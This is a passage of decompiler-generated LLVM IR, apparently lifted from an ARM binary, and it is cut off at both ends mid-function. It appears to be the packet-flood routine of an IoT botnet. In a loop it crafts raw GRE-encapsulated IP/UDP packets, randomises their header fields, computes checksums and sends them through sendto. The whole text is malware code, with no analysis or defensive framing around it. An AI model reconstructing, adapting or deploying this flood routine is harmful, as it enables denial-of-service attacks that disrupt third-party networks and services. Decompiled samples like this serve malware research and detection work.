  store i32 %v3_91e0, i32* %r4.global-to-local, align 4
  %v0_91e4 = load i32, i32* @sl, align 4
  %v2_91e4 = icmp eq i32 %v0_91e4, 0
  store i1 %v2_91e4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_91fc = urem i32 %v0_91d0, 65536
  store i32 %v3_91fc, i32* @fp, align 4
  br i1 %v2_91e4, label %dec_label_pc_9640, label %dec_label_pc_920c

dec_label_pc_920c:                                ; preds = %dec_label_pc_91c8
  %v3_91cc = mul i32 %v0_91cc, 65536
  %v3_91c8 = mul i32 %v0_91c8, 65536
  %v0_91d0.not = or i32 %v0_91d0, -65536
  %v1_9210 = xor i32 %v0_91d0.not, 65535
  %v3_9214 = mul i32 %v6_9128, 65536
  %v1_9218 = add i32 %v3_9214, 3407872
  %tmp67 = udiv i32 %v1_9218, 256
  %v3_922c = and i32 %tmp67, 65280
  %tmp68 = mul nsw i32 %v1_9210, 256
  %v3_9230 = and i32 %tmp68, 65280
  store i32 %v3_9230, i32* %ip.global-to-local, align 4
  %v1_9234 = add i32 %v3_9214, 524288
  %v1_923c = add i32 %v3_9214, 1835008
  %tmp69 = udiv i32 %v1_9210, 256
  %v4_9240 = urem i32 %tmp69, 256
  %v5_9240 = or i32 %v4_9240, %v3_9230
  %v4_9248 = udiv i32 %v1_9218, 16777216
  %v5_9248 = or i32 %v3_922c, %v4_9248
  store i32 %v5_9248, i32* @r8, align 4
  %v3_9254 = udiv i32 %v1_923c, 256
  %tmp70 = mul i32 %v0_91d0, 256
  %v3_9258 = and i32 %tmp70, 65280
  store i32 %v3_91c8, i32* %r2.global-to-local, align 4
  %tmp71 = udiv i32 %v0_91d0, 256
  %v4_9268 = urem i32 %tmp71, 256
  %v5_9268 = or i32 %v4_9268, %v3_9258
  %tmp72 = mul i32 %v0_91c8, 256
  %v3_926c = and i32 %tmp72, 65280
  %v1_9270 = and i32 %v3_9254, 65280
  store i32 %v1_9270, i32* @r6, align 4
  store i32 %v3_91cc, i32* %r1.global-to-local, align 4
  %tmp73 = mul i32 %v0_91cc, 256
  %v3_927c = and i32 %tmp73, 65280
  %tmp74 = udiv i32 %v0_91c8, 256
  %v4_9280 = urem i32 %tmp74, 256
  %v5_9280 = or i32 %v4_9280, %v3_926c
  store i32 %v5_9280, i32* @lr, align 4
  %v4_9284 = udiv i32 %v1_923c, 16777216
  %v5_9284 = or i32 %v1_9270, %v4_9284
  store i32 %v5_9284, i32* %r3.global-to-local, align 4
  %tmp75 = udiv i32 %v0_91cc, 256
  %v4_9288 = urem i32 %tmp75, 256
  %v5_9288 = or i32 %v4_9288, %v3_927c
  %tmp76 = udiv i32 %v1_9234, 256
  %v3_928c = and i32 %tmp76, 65280
  store i32 %v3_928c, i32* @r5, align 4
  %v4_92a0 = udiv i32 %v1_9234, 16777216
  %v5_92a0 = or i32 %v3_928c, %v4_92a0
  store i32 %v5_92a0, i32* @r7, align 4
  store i32 0, i32* @r4, align 4
  %sext12 = mul nuw i32 %v5_9268, 65536
  %v4_930c13 = sdiv i32 %sext12, 65536
  %sext8 = mul nuw i32 %v5_9284, 65536
  %v4_9370 = sdiv i32 %sext8, 65536
  %sext9 = mul nuw i32 %v5_9240, 65536
  %v4_9374 = sdiv i32 %sext9, 65536
  %v1_937c = trunc i32 %v4_9370 to i16
  %v2_93a4 = icmp eq i32 %v1_91d4, 0
  %sext10 = mul nuw i32 %v5_9280, 65536
  %v4_93c4 = sdiv i32 %sext10, 65536
  %sext11 = mul nuw i32 %v5_9288, 65536
  %v4_93cc = sdiv i32 %sext11, 65536
  %v1_9304 = trunc i32 %v6_90b0 to i8
  br label %dec_label_pc_92a8

dec_label_pc_92a8:                                ; preds = %bb82, %dec_label_pc_920c
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_92b4 = call i32 @calloc(i32 1510, i32 4)
  store i32 %v2_905c, i32* %r2.global-to-local, align 4
  %v3_92bc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_92bc, i32* %r3.global-to-local, align 4
  %v2_92c0 = load i32, i32* @r4, align 4
  %v5_92c0 = mul i32 %v2_92c0, 4
  %v6_92c0 = add i32 %v5_92c0, %v2_905c
  %v7_92c0 = inttoptr i32 %v6_92c0 to i32*
  store i32 %v2_92b4, i32* %v7_92c0, align 4
  %v0_92c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_92c4 = load i32, i32* %r3.global-to-local, align 4
  %v4_92c4 = mul i32 %v1_92c4, 4
  %v5_92c4 = add i32 %v4_92c4, %v0_92c4
  %v6_92c4 = inttoptr i32 %v5_92c4 to i32*
  %v7_92c4 = load i32, i32* %v6_92c4, align 4
  store i32 %v7_92c4, i32* %r4.global-to-local, align 4
  %v1_92c8 = inttoptr i32 %v7_92c4 to i8*
  %v2_92c8 = load i8, i8* %v1_92c8, align 1
  %tmp = urem i8 %v2_92c8, 16
  %v1_92cc = zext i8 %tmp to i32
  %v1_92d0 = or i32 %v1_92cc, 64
  store i32 %v1_92d0, i32* %r2.global-to-local, align 4
  %v1_92d4 = trunc i32 %v1_92d0 to i8
  store i8 %v1_92d4, i8* %v1_92c8, align 1
  %v0_92d8 = load i32, i32* %r3.global-to-local, align 4
  %v5_92dc = mul i32 %v0_92d8, 24
  store i32 %v5_92dc, i32* %r1.global-to-local, align 4
  %v0_92e0 = load i32, i32* %r4.global-to-local, align 4
  %v1_92e0 = inttoptr i32 %v0_92e0 to i8*
  %v2_92e0 = load i8, i8* %v1_92e0, align 1
  %v1_92e4 = and i8 %v2_92e0, -16
  %v1_92e8 = or i8 %v1_92e4, 5
  store i32 %v1_90dc, i32* %r5.global-to-local, align 4
  store i8 %v1_92e8, i8* %v1_92e0, align 1
  store i32 %v6_9074, i32* %r2.global-to-local, align 4
  %v2_92f8 = load i32, i32* %r4.global-to-local, align 4
  %v3_92f8 = add i32 %v2_92f8, 1
  %v4_92f8 = inttoptr i32 %v3_92f8 to i8*
  store i8 %v5_9094, i8* %v4_92f8, align 1
  store i32 %v1_90b8, i32* %r3.global-to-local, align 4
  %v0_9300 = load i32, i32* %r5.global-to-local, align 4
  %v2_9300 = icmp eq i32 %v0_9300, 0
  store i1 %v2_9300, i1* %cpsr_z.global-to-local, align 1
  %v2_9304 = load i32, i32* %r4.global-to-local, align 4
  %v3_9304 = add i32 %v2_9304, 8
  %v4_9304 = inttoptr i32 %v3_9304 to i8*
  store i8 %v1_9304, i8* %v4_9304, align 1
  %v0_9308 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9308, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_92a8
  store i32 %v4_930c13, i32* %r5.global-to-local, align 4
  br label %bb77

bb:                                               ; preds = %dec_label_pc_92a8
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v4_930c13, i32* %r5.global-to-local, align 4
  %v3_9310 = load i32, i32* %r4.global-to-local, align 4
  %v4_9310 = add i32 %v3_9310, 6
  %v5_9310 = inttoptr i32 %v4_9310 to i16*
  store i16 64, i16* %v5_9310, align 2
  br label %bb77

bb77:                                             ; preds = %.thread, %bb
  %v2_9318 = load i32, i32* %r4.global-to-local, align 4
  %v3_9318 = add i32 %v2_9318, 9
  %v4_9318 = inttoptr i32 %v3_9318 to i8*
  store i8 47, i8* %v4_9318, align 1
  %v0_931c = load i32, i32* %r4.global-to-local, align 4
  %v1_931c = add i32 %v0_931c, 20
  store i32 %v1_931c, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v0_9324 = load i32, i32* %r5.global-to-local, align 4
  %v1_9324 = trunc i32 %v0_9324 to i16
  %v3_9324 = add i32 %v0_931c, 4
  %v4_9324 = inttoptr i32 %v3_9324 to i16*
  store i16 %v1_9324, i16* %v4_9324, align 2
  %v0_9328 = load i32, i32* @r8, align 4
  %v1_9328 = trunc i32 %v0_9328 to i16
  %v2_9328 = load i32, i32* %r4.global-to-local, align 4
  %v3_9328 = add i32 %v2_9328, 2
  %v4_9328 = inttoptr i32 %v3_9328 to i16*
  store i16 %v1_9328, i16* %v4_9328, align 2
  %v0_932c = load i32, i32* %r3.global-to-local, align 4
  %v1_932c = trunc i32 %v0_932c to i16
  %v2_932c = load i32, i32* %r2.global-to-local, align 4
  %v3_932c = add i32 %v2_932c, 2
  %v4_932c = inttoptr i32 %v3_932c to i16*
  store i16 %v1_932c, i16* %v4_932c, align 2
  store i32 %v6_917c, i32* %r3.global-to-local, align 4
  %v0_9334 = load i32, i32* %r4.global-to-local, align 4
  %v1_9334 = add i32 %v0_9334, 24
  %v2_9334 = inttoptr i32 %v1_9334 to i8*
  %v3_9334 = load i8, i8* %v2_9334, align 1
  %v4_9334 = zext i8 %v3_9334 to i32
  store i32 %v4_9334, i32* %r2.global-to-local, align 4
  %v2_9338 = add i32 %v0_9334, 12
  %v3_9338 = inttoptr i32 %v2_9338 to i32*
  store i32 %v6_917c, i32* %v3_9338, align 4
  %v0_933c = load i32, i32* %r2.global-to-local, align 4
  %v1_933c = and i32 %v0_933c, -241
  %v1_9340 = or i32 %v1_933c, 64
  store i32 %v1_9340, i32* %r2.global-to-local, align 4
  %v0_9344 = load i32, i32* %r1.global-to-local, align 4
  %v1_9344 = load i32, i32* @sb, align 4
  %v2_9344 = add i32 %v1_9344, %v0_9344
  store i32 %v2_9344, i32* %r1.global-to-local, align 4
  %v1_9348 = add i32 %v2_9344, 16
  %v2_9348 = inttoptr i32 %v1_9348 to i32*
  %v3_9348 = load i32, i32* %v2_9348, align 4
  store i32 %v3_9348, i32* %r1.global-to-local, align 4
  %v1_934c = trunc i32 %v1_9340 to i8
  %v2_934c = load i32, i32* %r4.global-to-local, align 4
  %v3_934c = add i32 %v2_934c, 24
  %v4_934c = inttoptr i32 %v3_934c to i8*
  store i8 %v1_934c, i8* %v4_934c, align 1
  %v0_9350 = load i32, i32* %r4.global-to-local, align 4
  %v1_9350 = add i32 %v0_9350, 24
  %v2_9350 = inttoptr i32 %v1_9350 to i8*
  %v3_9350 = load i8, i8* %v2_9350, align 1
  %v1_9354 = and i8 %v3_9350, -16
  %v1_9358 = or i8 %v1_9354, 5
  store i8 %v1_9358, i8* %v2_9350, align 1
  %v0_9360 = load i32, i32* %r1.global-to-local, align 4
  %v1_9360 = load i32, i32* %r4.global-to-local, align 4
  %v2_9360 = add i32 %v1_9360, 16
  %v3_9360 = inttoptr i32 %v2_9360 to i32*
  store i32 %v0_9360, i32* %v3_9360, align 4
  %v0_9368 = load i32, i32* %r4.global-to-local, align 4
  %v1_9368 = add i32 %v0_9368, 24
  store i32 %v1_9368, i32* @r5, align 4
  %v3_936c = add i32 %v0_9368, 25
  %v4_936c = inttoptr i32 %v3_936c to i8*
  store i8 %v5_9094, i8* %v4_936c, align 1
  store i32 %v4_9370, i32* %r2.global-to-local, align 4
  store i32 %v4_9374, i32* %r3.global-to-local, align 4
  store i32 %v1_90b8, i32* %r1.global-to-local, align 4
  %v2_937c = load i32, i32* @r5, align 4
  %v3_937c = add i32 %v2_937c, 2
  %v4_937c = inttoptr i32 %v3_937c to i16*
  store i16 %v1_937c, i16* %v4_937c, align 2
  %v0_9380 = load i32, i32* %r3.global-to-local, align 4
  %v1_9380 = trunc i32 %v0_9380 to i16
  %v2_9380 = load i32, i32* @r5, align 4
  %v3_9380 = add i32 %v2_9380, 4
  %v4_9380 = inttoptr i32 %v3_9380 to i16*
  store i16 %v1_9380, i16* %v4_9380, align 2
  %v0_9384 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9384, label %bb79, label %bb78

bb78:                                             ; preds = %bb77
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %bb77, %bb78
  store i32 17, i32* %r3.global-to-local, align 4
  %v0_938c = load i32, i32* %r1.global-to-local, align 4
  %v1_938c = trunc i32 %v0_938c to i8
  %v2_938c = load i32, i32* @r5, align 4
  %v3_938c = add i32 %v2_938c, 8
  %v4_938c = inttoptr i32 %v3_938c to i8*
  store i8 %v1_938c, i8* %v4_938c, align 1
  %v0_9390 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9390, label %bb81, label %bb80

bb80:                                             ; preds = %bb79
  %v1_9390 = load i32, i32* %r2.global-to-local, align 4
  %v2_9390 = trunc i32 %v1_9390 to i16
  %v3_9390 = load i32, i32* @r5, align 4
  %v4_9390 = add i32 %v3_9390, 6
  %v5_9390 = inttoptr i32 %v4_9390 to i16*
  store i16 %v2_9390, i16* %v5_9390, align 2
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v0_9394 = load i32, i32* %r3.global-to-local, align 4
  %v1_9394 = trunc i32 %v0_9394 to i8
  %v2_9394 = load i32, i32* @r5, align 4
  %v3_9394 = add i32 %v2_9394, 9
  %v4_9394 = inttoptr i32 %v3_9394 to i8*
  store i8 %v1_9394, i8* %v4_9394, align 1
  %v0_9398 = call i32 @rand_next()
  store i32 %v1_91d4, i32* %r1.global-to-local, align 4
  store i1 %v2_93a4, i1* %cpsr_z.global-to-local, align 1
  %v1_93a8 = sub i32 1023, %v0_9398
  store i32 %v1_93a8, i32* %r3.global-to-local, align 4
  br i1 %v2_93a4, label %.thread14, label %.thread15

.thread14:                                        ; preds = %bb81
  %v2_93b0 = load i32, i32* @r5, align 4
  %v3_93b0 = add i32 %v2_93b0, 16
  %v4_93b0 = inttoptr i32 %v3_93b0 to i32*
  store i32 %v1_93a8, i32* %v4_93b0, align 4
  br label %bb82

.thread15:                                        ; preds = %bb81
  %v1_93ac = load i32, i32* %r4.global-to-local, align 4
  %v2_93ac = add i32 %v1_93ac, 16
  %v3_93ac = inttoptr i32 %v2_93ac to i32*
  %v4_93ac = load i32, i32* %v3_93ac, align 4
  store i32 %v4_93ac, i32* %r3.global-to-local, align 4
  %v2_93b4 = load i32, i32* @r5, align 4
  %v3_93b4 = add i32 %v2_93b4, 16
  %v4_93b4 = inttoptr i32 %v3_93b4 to i32*
  store i32 %v4_93ac, i32* %v4_93b4, align 4
  br label %bb82

bb82:                                             ; preds = %.thread14, %.thread15
  %v1_93b8 = load i32, i32* @r5, align 4
  %v2_93b8 = add i32 %v1_93b8, 12
  %v3_93b8 = inttoptr i32 %v2_93b8 to i32*
  store i32 %v0_9398, i32* %v3_93b8, align 4
  %v3_93bc = load i32, i32* %stack_var_-44, align 4
  %v0_93c0 = load i32, i32* %r4.global-to-local, align 4
  %v1_93c0 = add i32 %v0_93c0, 44
  store i32 %v1_93c0, i32* @r6, align 4
  store i32 %v4_93c4, i32* %r2.global-to-local, align 4
  %v1_93c8 = add i32 %v3_93bc, 1
  store i32 %v1_93c8, i32* @r4, align 4
  store i32 %v4_93cc, i32* %r3.global-to-local, align 4
  %v1_93d0 = load i32, i32* @sl, align 4
  %v9_93d0 = icmp eq i32 %v1_93c8, %v1_93d0
  store i1 %v9_93d0, i1* %cpsr_z.global-to-local, align 1
  %v0_93d4 = load i32, i32* @r7, align 4
  %v1_93d4 = trunc i32 %v0_93d4 to i16
  %v3_93d4 = add i32 %v0_93c0, 48
  %v4_93d4 = inttoptr i32 %v3_93d4 to i16*
  store i16 %v1_93d4, i16* %v4_93d4, align 2
  %v0_93d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_93d8 = trunc i32 %v0_93d8 to i16
  %v2_93d8 = load i32, i32* @r6, align 4
  %v3_93d8 = inttoptr i32 %v2_93d8 to i16*
  store i16 %v1_93d8, i16* %v3_93d8, align 2
  %v0_93dc = load i32, i32* %r3.global-to-local, align 4
  %v1_93dc = trunc i32 %v0_93dc to i16
  %v2_93dc = load i32, i32* @r6, align 4
  %v3_93dc = add i32 %v2_93dc, 2
  %v4_93dc = inttoptr i32 %v3_93dc to i16*
  store i16 %v1_93dc, i16* %v4_93dc, align 2
  %v0_93e0 = load i32, i32* @r4, align 4
  store i32 %v0_93e0, i32* %stack_var_-44, align 4
  %v5_93e4 = icmp slt i32 %v1_93c8, %v1_93d0
  br i1 %v5_93e4, label %dec_label_pc_92a8, label %dec_label_pc_93e8

dec_label_pc_93e8:                                ; preds = %bb82
  store i32 %v6_9128, i32* %r5.global-to-local, align 4
  %v1_93f0 = add i32 %v6_9128, 8
  store i32 %v1_93f0, i32* %r4.global-to-local, align 4
  %v0_9400.pre.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_93fc.preheader

dec_label_pc_93fc.preheader:                      ; preds = %dec_label_pc_93e8, %dec_label_pc_9640
  %v0_9400.pre = phi i32 [ %v0_9400.pre.pre, %dec_label_pc_93e8 ], [ 0, %dec_label_pc_9640 ]
  %stack_var_-124.0.ph = phi i32 [ %v1_93f0, %dec_label_pc_93e8 ], [ %v1_9648, %dec_label_pc_9640 ]
  %storemerge = add i32 %v6_9128, 52
  store i32 %storemerge, i32* @r8, align 4
  %v2_95f4 = icmp eq i32 %v1_91d4, 0
  %v2_9610 = icmp eq i32 %v1_9148, 0
  %v2_943c = icmp eq i32 %v6_917c, -1
  %v7_943c = icmp eq i32 %v6_917c, -1
  br label %dec_label_pc_93fc

dec_label_pc_93fc:                                ; preds = %dec_label_pc_93fc, %dec_label_pc_948c, %dec_label_pc_93fc.preheader
  %v0_9400 = phi i32 [ %v0_9400.pre, %dec_label_pc_93fc.preheader ], [ 0, %dec_label_pc_93fc ], [ %v1_9528, %dec_label_pc_948c ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_9400 = icmp eq i32 %v0_9400, 0
  store i1 %v2_9400, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_9400, label %dec_label_pc_93fc, label %dec_label_pc_940c

dec_label_pc_940c:                                ; preds = %dec_label_pc_93fc
  br label %dec_label_pc_9410

dec_label_pc_9410:                                ; preds = %dec_label_pc_948c, %dec_label_pc_940c
  %v1_9424 = phi i32 [ %v1_9524, %dec_label_pc_948c ], [ 0, %dec_label_pc_940c ]
  %v5_9414 = mul i32 %v1_9424, 24
  %v1_9418 = load i32, i32* @sb, align 4
  %v2_9418 = add i32 %v1_9418, %v5_9414
  store i32 %v2_9418, i32* %r3.global-to-local, align 4
  store i32 %v2_905c, i32* %r4.global-to-local, align 4
  %v1_9420 = add i32 %v2_9418, 20
  %v2_9420 = inttoptr i32 %v1_9420 to i8*
  %v3_9420 = load i8, i8* %v2_9420, align 1
  %v4_9420 = zext i8 %v3_9420 to i32
  store i32 %v4_9420, i32* %r2.global-to-local, align 4
  %v4_9424 = mul i32 %v1_9424, 4
  %v5_9424 = add i32 %v4_9424, %v2_905c
  %v6_9424 = inttoptr i32 %v5_9424 to i32*
  %v7_9424 = load i32, i32* %v6_9424, align 4
  store i32 %v7_9424, i32* @r5, align 4
  %v7_9428 = icmp eq i8 %v3_9420, 31
  store i1 %v7_9428, i1* %cpsr_z.global-to-local, align 1
  %v1_942c = add i32 %v7_9424, 24
  store i32 %v1_942c, i32* @r6, align 4
  %v1_9430 = add i32 %v7_9424, 44
  store i32 %v1_9430, i32* @r7, align 4
  %tmp86 = icmp ult i8 %v3_9420, 32
  br i1 %tmp86, label %dec_label_pc_9538, label %dec_label_pc_9438

dec_label_pc_9438:                                ; preds = %dec_label_pc_9410
  store i32 %v6_917c, i32* %r1.global-to-local, align 4
  store i1 %v7_943c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_943c, label %dec_label_pc_9598, label %dec_label_pc_9444

dec_label_pc_9444:                                ; preds = %dec_label_pc_9538, %dec_label_pc_9438
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_944c = load i32, i32* @fp, align 4
  %v9_944c = icmp eq i32 %v0_944c, 65535
  store i1 %v9_944c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_944c, label %dec_label_pc_95b0, label %dec_label_pc_9454

dec_label_pc_9454:                                ; preds = %dec_label_pc_9598.dec_label_pc_9454_crit_edge, %dec_label_pc_9444
  %v1_9458 = phi i32 [ %v1_9458.pre, %dec_label_pc_9598.dec_label_pc_9454_crit_edge ], [ 65535, %dec_label_pc_9444 ]
  store i32 %v3_91dc, i32* %r2.global-to-local, align 4
  %v9_9458 = icmp eq i32 %v3_91dc, %v1_9458
  store i1 %v9_9458, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9458, label %dec_label_pc_95d8, label %dec_label_pc_9460

dec_label_pc_9460:                                ; preds = %dec_label_pc_95b0.dec_label_pc_9460_crit_edge, %dec_label_pc_9454
  %v1_9464 = phi i32 [ %v1_9464.pre, %dec_label_pc_95b0.dec_label_pc_9460_crit_edge ], [ %v1_9458, %dec_label_pc_9454 ]
  store i32 %v3_91e0, i32* %r3.global-to-local, align 4
  %v9_9464 = icmp eq i32 %v3_91e0, %v1_9464
  store i1 %v9_9464, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9464, label %dec_label_pc_95ec, label %dec_label_pc_946c

dec_label_pc_946c:                                ; preds = %dec_label_pc_95d8, %dec_label_pc_9460
  store i32 %v1_91d4, i32* @r4, align 4
  store i1 %v2_95f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_95f4, label %dec_label_pc_9608, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_946c
  %v1_9474 = load i32, i32* @r5, align 4
  %v2_9474 = add i32 %v1_9474, 16
  %v3_9474 = inttoptr i32 %v2_9474 to i32*
  %v4_9474 = load i32, i32* %v3_9474, align 4
  store i32 %v4_9474, i32* %r3.global-to-local, align 4
  %v2_9478 = load i32, i32* @r6, align 4
  %v3_9478 = add i32 %v2_9478, 16
  %v4_9478 = inttoptr i32 %v3_9478 to i32*
  store i32 %v4_9474, i32* %v4_9478, align 4
  br label %dec_label_pc_9480

dec_label_pc_9480:                                ; preds = %bb85, %.thread16
  store i32 %v1_9148, i32* %r1.global-to-local, align 4
  store i1 %v2_9610, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9610, label %dec_label_pc_948c, label %dec_label_pc_961c

dec_label_pc_948c:                                ; preds = %dec_label_pc_9480, %dec_label_pc_9608, %dec_label_pc_961c
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_9490 = load i32, i32* @r5, align 4
  %v3_9490 = add i32 %v2_9490, 10
  %v4_9490 = inttoptr i32 %v3_9490 to i16*
  store i16 0, i16* %v4_9490, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_9498 = load i32, i32* @r5, align 4
  store i32 %v0_9498, i32* @r0, align 4
  %v2_949c = call i32 @checksum_generic(i32 %v0_9498, i32 20)
  %v3_949c = trunc i32 %v2_949c to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_94a4 = load i32, i32* @r5, align 4
  %v4_94a4 = add i32 %v3_94a4, 10
  %v5_94a4 = inttoptr i32 %v4_94a4 to i16*
  store i16 %v3_949c, i16* %v5_94a4, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_94ac = load i32, i32* %r3.global-to-local, align 4
  %v1_94ac = trunc i32 %v0_94ac to i16
  %v2_94ac = load i32, i32* @r6, align 4
  %v3_94ac = add i32 %v2_94ac, 10
  %v4_94ac = inttoptr i32 %v3_94ac to i16*
  store i16 %v1_94ac, i16* %v4_94ac, align 2
  %v0_94b0 = load i32, i32* @r6, align 4
  store i32 %v0_94b0, i32* @r0, align 4
  %v2_94b4 = call i32 @checksum_generic(i32 %v0_94b0, i32 20)
  %v3_94b4 = trunc i32 %v2_94b4 to i16
  %v3_94b8 = load i32, i32* @r6, align 4
  %v4_94b8 = add i32 %v3_94b8, 10
  %v5_94b8 = inttoptr i32 %v4_94b8 to i16*
  store i16 %v3_94b4, i16* %v5_94b8, align 2
  store i32 0, i32* @r4, align 4
  %v0_94c0 = load i32, i32* @r7, align 4
  store i32 %v0_94c0, i32* @r1, align 4
  %v1_94c4 = add i32 %v0_94c0, 4
  %v2_94c4 = inttoptr i32 %v1_94c4 to i16*
  %v3_94c4 = load i16, i16* %v2_94c4, align 2
  %v4_94c4 = zext i16 %v3_94c4 to i32
  store i32 %v4_94c4, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-124.0.ph, i32* %r3.global-to-local, align 4
  %v3_94cc = add i32 %v0_94c0, 6
  %v4_94cc = inttoptr i32 %v3_94cc to i16*
  store i16 0, i16* %v4_94cc, align 2
  %v0_94d0 = load i32, i32* @r6, align 4
  %v4_94d4 = call i32 @checksum_tcpudp(i32 %v0_94d0, i32 %v0_94c0, i32 %v4_94c4, i32 %stack_var_-124.0.ph)
  %v5_94d4 = trunc i32 %v4_94d4 to i16
  %v3_94d8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_94d8, i32* %r2.global-to-local, align 4
  %v3_94dc = mul i32 %v3_94d8, 32
  store i32 %v3_94dc, i32* %r3.global-to-local, align 4
  %v0_94e0 = load i32, i32* @r5, align 4
  %v1_94e0 = add i32 %v0_94e0, 16
  %v2_94e0 = inttoptr i32 %v1_94e0 to i32*
  %v3_94e0 = load i32, i32* %v2_94e0, align 4
  %v5_94e4 = mul i32 %v3_94d8, 24
  store i32 %v5_94e4, i32* %r3.global-to-local, align 4
  %v1_94e8 = load i32, i32* @sb, align 4
  %v2_94e8 = add i32 %v1_94e8, %v5_94e4
  store i32 %v2_94e8, i32* @lr, align 4
  %v2_94ec = add i32 %v2_94e8, 4
  %v3_94ec = inttoptr i32 %v2_94ec to i32*
  store i32 %v3_94e0, i32* %v3_94ec, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_94f4 = load i32, i32* @r7, align 4
  %v4_94f4 = add i32 %v3_94f4, 6
  %v5_94f4 = inttoptr i32 %v4_94f4 to i16*
  store i16 %v5_94d4, i16* %v5_94f4, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_94fc = load i32, i32* %r1.global-to-local, align 4
  %v1_94fc = trunc i32 %v0_94fc to i16
  %v2_94fc = load i32, i32* %r3.global-to-local, align 4
  %v3_94fc = load i32, i32* @sb, align 4
  %v4_94fc = add i32 %v3_94fc, %v2_94fc
  %v5_94fc = inttoptr i32 %v4_94fc to i16*
  store i16 %v1_94fc, i16* %v5_94fc, align 2
  %v0_9500 = load i32, i32* @r4, align 4
  %v1_9500 = trunc i32 %v0_9500 to i16
  %v2_9500 = load i32, i32* @lr, align 4
  %v3_9500 = add i32 %v2_9500, 2
  %v4_9500 = inttoptr i32 %v3_9500 to i16*
  store i16 %v1_9500, i16* %v4_9500, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_9508 = load i32, i32* @r5, align 4
  store i32 %v0_9508, i32* %r1.global-to-local, align 4
  %v0_9510 = load i32, i32* @r8, align 4
  store i32 %v0_9510, i32* %r2.global-to-local, align 4
  %v0_9514 = load i32, i32* @lr, align 4
  %v0_9518 = load i32, i32* %ip.global-to-local, align 4
  %v6_951c = call i32 @__libc_sendto(i32 %v3_9190, i32 %v0_9508, i32 %v0_9510, i32 16384, i32 %v0_9514, i32 %v0_9518)
  %v3_9520 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9520, i32* %r3.global-to-local, align 4
  %v1_9524 = add i32 %v3_9520, 1
  %v1_9528 = load i32, i32* @sl, align 4
  %v9_9528 = icmp eq i32 %v1_9524, %v1_9528
  store i1 %v9_9528, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_9524, i32* %stack_var_-44, align 4
  %v6_9530 = icmp slt i32 %v1_9524, %v1_9528
  br i1 %v6_9530, label %dec_label_pc_9410, label %dec_label_pc_93fc

dec_label_pc_9538:                                ; preds = %dec_label_pc_9410
  %v1_9538 = add i32 %v2_9418, 16
  %v2_9538 = inttoptr i32 %v1_9538 to i32*
  %v3_9538 = load i32, i32* %v2_9538, align 4
  store i32 %v3_9538, i32* %r4.global-to-local, align 4
  %v0_953c = call i32 @rand_next()
  %v3_9540 = load i32, i32* %stack_var_-44, align 4
  %v5_9548 = mul i32 %v3_9540, 24
  %v0_954c = load i32, i32* %r4.global-to-local, align 4
  %v1_954c = and i32 %v0_954c, 16711680
  store i32 %v1_954c, i32* %ip.global-to-local, align 4
  %v3_9550 = udiv i32 %v0_954c, 16777216
  %v4_9554 = udiv i32 %v1_954c, 256
  %v5_9554 = or i32 %v4_9554, %v3_9550
  store i32 %v5_9554, i32* %r2.global-to-local, align 4
  %v1_9558 = load i32, i32* @sb, align 4
  %v2_9558 = add i32 %v1_9558, %v5_9548
  store i32 %v2_9558, i32* %r1.global-to-local, align 4
  %v1_955c = and i32 %v0_954c, 65280
  store i32 %v1_955c, i32* %r3.global-to-local, align 4
  %v1_9560 = add i32 %v2_9558, 20
  %v2_9560 = inttoptr i32 %v1_9560 to i8*
  %v3_9560 = load i8, i8* %v2_9560, align 1
  %v4_9560 = zext i8 %v3_9560 to i32
  store i32 %v4_9560, i32* %ip.global-to-local, align 4
  %v5_9568 = call i32 @llvm.bswap.i32(i32 %v0_954c)
  %v7_956c = lshr i32 %v0_953c, %v4_9560
  %v8_956c = add i32 %v7_956c, %v5_9568
  store i32 %v8_956c, i32* %r2.global-to-local, align 4
  store i32 %v6_917c, i32* %r1.global-to-local, align 4
  %v5_9588 = call i32 @llvm.bswap.i32(i32 %v8_956c)
  store i32 %v5_9588, i32* %r3.global-to-local, align 4
  store i1 %v7_943c, i1* %cpsr_z.global-to-local, align 1
  %v1_9590 = load i32, i32* @r5, align 4
  %v2_9590 = add i32 %v1_9590, 16
  %v3_9590 = inttoptr i32 %v2_9590 to i32*
  store i32 %v5_9588, i32* %v3_9590, align 4
  br i1 %v2_943c, label %dec_label_pc_9598, label %dec_label_pc_9444

dec_label_pc_9598:                                ; preds = %dec_label_pc_9538, %dec_label_pc_9438
  %v0_9598 = call i32 @rand_next()
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_95a4 = load i32, i32* @fp, align 4
